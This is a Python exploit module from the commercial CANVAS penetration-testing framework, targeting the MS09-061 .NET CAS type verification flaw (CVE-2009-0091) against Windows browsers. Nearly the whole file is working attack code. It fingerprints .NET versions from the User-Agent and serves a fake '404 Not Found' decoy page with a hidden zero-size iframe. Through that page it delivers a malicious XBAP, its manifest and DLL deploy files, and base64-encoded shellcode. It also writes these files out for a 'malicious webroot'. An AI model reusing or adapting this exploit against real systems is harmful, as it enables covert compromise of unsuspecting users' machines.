##ImmunityHeader v1 
###############################################################################
## File       :  ms09_061_cas.py
## Description:  
##            :  
## Created_On :  Mon Dec 21 17:26:18 2009
## Created_By :  Justin Seitz
## Modified_On:  Mon Dec 21 17:41:22 2009
## Modified_By:  Justin Seitz
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import time
import base64

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from encoder import *

import canvasengine
import shellcodeGenerator

from httpclientside import httpclientside

NAME = 'MS09-061 Microsoft .NET CAS Type Verification Vulnerability'
DESCRIPTION = 'MS09-061 Microsoft .NET CAS Type Verification Vulnerability'
DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = 'Microsoft'
DOCUMENTATION['URL'] = 'http://www.microsoft.com/technet/security/Bulletin/MS09-061.mspx'
DOCUMENTATION['CVE Name'] = 'CVE-2009-0091'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0091'

VERSION = '0.1'

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['TYPE'] = "Exploit"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [
    'Microsoft .NET Framework 2.0',
    'Microsoft .NET Framework 2.0 SP1', 
    'Microsoft .NET Framework 3.5',
]
PROPERTY['DELIVERY'] = 'HTTP'

XBAP = 1
DEPLOY = 2
DLLDEPLOY = 3
MANIFEST = 4

class theexploit(httpclientside):
    def __init__(self):        
        httpclientside.__init__(self)
                                   
        self.name = NAME
        self.htmlfile = "index.html"
        # filename is used in the actual http server
        self.filename = self.htmlfile
        self.resdir = "Resources/ms09_061_cas/"
        self.xbapfile = "pageerror.xbap"
        self.manifestfile = "pageerror.exe.manifest"
        self.deployfile = "pageerror.exe.deploy"
        self.dlldeployfile = "CombinePoCHelper.dll.deploy"    
        
        self.appfilesdir = "Application Files"
        self.xbapdir = "pageerror_1_0_0_19"
        self.xbapcontainer = '/'.join([self.appfilesdir, self.xbapdir, ''])

        self.CANSessID = None                   
        self.clientd_host = None
        self.shellcode_uri = 'ErrorMessageDetails'
            
    def is_vulnerable( self, info_dict ):
    
        import re
        regex = ".NET CLR ([\d.]*\d+)"
        score = 0
        results = re.findall( regex, info_dict['user_agent'] )
        
        if len(results) > 0:
            for version in results:
                version = version.split(".")
                major   = int(version[0])
                minor   = int(version[1])
                patch   = int(version[2])
                
                # 1.x .NET not vulnerable
                if major == 1:
                    continue
                
                # 2.0.50727.42 and 8.0.50727.42
                if major == 2 or major == 8:
                    # We need to know the build number
                    if minor == 0 and patch == 50727:
                        try:
                            build   = int(version[3])                        
                            
                            if build <= 3053:
                                score = 100
                            
                        except:
                            # No SP1
                            score = 90
                            continue
                
                if major == 3 and minor == 5 or major == 9 and minor == 0:
                    if patch == 21022:
                        try:
                            build = int(version[3])
                            
                            if build <= 8:                            
                                score = 100
                        except:
                            # No SP's
                            score = 90
                            continue
                        
                    if patch == 30729:
                        try:
                            build = int(version[3])
                            
                            if build <= 1:                            
                                score = 100
                        except:
                            # No SP's
                            score = 90
                            continue            
            return score
                                                    
    def getArgs(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get('port', self.port))
        return
        
    def makefile(self):
        if not hasattr(self, "sessionstate"):
            self.log("Not being run under clientd - sessionstate not set!")
            self.log("Aborting")
            return ""
        
        self.clientd_host  = self.sessionstate.loader.canvasobj.getBaseURL()
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body onload="foo();">
            <script type="text/javascript">
            function reload() {
               window.location = "/done";
            }
            function foo() {
               setTimeout('reload()', 5000);
            }
            </script>
            
            <iframe src="%s?error=%s&CANSessID=%s" width="0" height="0" />
            <h1>Not Found</h1>
            <p>The requested URL /%s was not found on this server.</p>
            <hr>
            
            </body>
        </html>
        """ % (self.xbapfile, 
               base64.b64encode('/aa?'.join([self.clientd_host, 
                                          self.shellcode_uri])),
               self.CANSessID,
               self.htmlfile) 

        return html    

    def makedownloadfile(self, dfile):
        if dfile == XBAP:
            return file(self.resdir + self.xbapfile, 'rb').read()
        elif dfile == MANIFEST:
            return file(self.resdir + self.xbapcontainer + self.manifestfile, 
                        'rb').read()
        elif dfile == DEPLOY:
            return file(self.resdir + self.xbapcontainer + self.deployfile,
                        'rb').read()
        elif dfile == DLLDEPLOY:
            return file(self.resdir + self.xbapcontainer + self.dlldeployfile,
                        'rb').read()
        else:
            raise Exception("Unknown download file type %d" % dfile)
        
    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h           = header('SERVER')        
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])        
        
        if hasattr(self, "sessionstate"):
            #we need to pass our SID into our exploit CAB file!
            self.CANSessID = self.sessionstate.sid 
            self.log("SID: %s"%self.CANSessID) 
            
        self.log("[+] User agent of connecting host: %s" % user_agent)          
        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())           
        elif clientheader.URL.count(self.xbapfile):
            self.log("[+] Sending XBAP")
            data = self.makedownloadfile(XBAP)
            self.log("[+] Sending %d bytes" % len(data))            
            h.addHeader('Content-type', 'application/x-ms-xbap')
            h.addHeader('Accept-Ranges', 'bytes')                        
            b.setBody(data)
        elif clientheader.URL.count(self.manifestfile):
            self.log("[+] Sending manifest")
            data = self.makedownloadfile(MANIFEST)
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'application/manifest')
            h.addHeader('Accept-Ranges', 'bytes')                        
            b.setBody(data)
        elif clientheader.URL.count(self.deployfile):
            self.log("[+] Sending deploy file")
            data = self.makedownloadfile(DEPLOY)
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'application/octet-stream')
            h.addHeader('Accept-Ranges', 'bytes')                        
            b.setBody(data)            
        elif clientheader.URL.count(self.dlldeployfile):
            self.log("[+] Sending DLL deploy file")
            data = self.makedownloadfile(DLLDEPLOY)
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'application/octet-stream')
            h.addHeader('Accept-Ranges', 'bytes')                        
            b.setBody(data)              
        elif clientheader.URL.count(self.shellcode_uri):
            self.log("[+] Sending back shellcode")
            data = base64.b64encode(self.createShellcode())
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'application/octet-stream')
            h.addHeader('Accept-Ranges', 'bytes')                        
            b.setBody(data)              
        elif clientheader.URL.count("done"):
            self.log("We're done and the exploit failed...returning None")
            return None, None 
        elif clientheader.URL.count("done"):
            self.log("We're done and the exploit failed...returning None")
            return None, None 

        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')            

        return h,b
    
    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makefile()        

        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = open(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening XBAP %s for output" % self.xbapfile)
        fd = open(self.xbapfile, 'wb+')
        fd.write(self.makedownloadfile(XBAP))
        fd.close()
        self.log("[+] Wrote to %s" % self.xbapfile)
        
        self.log("[+] Opening XBAP resources directory %s for output" % 
                 self.xbapcontainer)                 
        try:
            os.makedirs(self.xbapcontainer)
        except:
            self.log("[!] Directory %s already exists. Continuing..." % 
                     self.xbapcontainer)                     
        
        oFile = self.xbapcontainer + self.manifestfile
        self.log("[+] Opening manifest file %s for output" % oFile)
        fd = open(oFile, 'wb')
        fd.write(self.makedownloadfile(MANIFEST))
        fd.close()
        self.log("[+] Wrote to %s " % oFile) 
                
        oFile = self.xbapcontainer + self.deployfile
        self.log("[+] Opening deploy file %s for output" % oFile)
        fd = open(oFile, 'wb')
        fd.write(self.makedownloadfile(DEPLOY))
        fd.close()
        self.log("[+] Wrote to %s " % oFile) 
        
        oFile = self.xbapcontainer  + self.dlldeployfile
        self.log("[+] Opening dll deploy file %s for output" % oFile)
        fd = open(oFile, 'wb')
        fd.write(self.makedownloadfile(DLLDEPLOY))
        fd.close()
        self.log("[+] Wrote to %s " % oFile) 

        self.log("[+] Place all files together in malicious webroot")        
        self.log(
            "[+] ** Ensure you place the directory %s and the files %s and %s at the same location **" %
                 (self.appfilesdir,
                 self.htmlfile,
                 self.xbapfile)                
        )
    
        return 1
    
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

